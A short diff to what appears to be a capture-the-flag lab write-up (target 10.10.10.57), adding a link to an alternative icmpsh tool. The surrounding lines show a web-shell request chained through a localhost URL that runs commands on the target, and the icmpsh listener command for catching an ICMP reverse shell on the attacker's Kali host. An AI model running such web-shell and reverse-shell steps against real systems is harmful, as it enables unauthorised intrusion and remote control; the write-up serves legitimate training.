@@ -432,7 +432,7 @@ We can verify that file was successfully created:
 http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx?xcmd=type%20C:\Temp\pwned.ps1
 ```
 
-Listen on your Kali host:
+Listen on your Kali host \(you may want another icmpsh that's not on python [https://github.com/bdamele/icmpsh](https://github.com/bdamele/icmpsh)\):
 
 ```text
 ❯ sudo python icmpsh_m.py 10.10.16.185 10.10.10.57
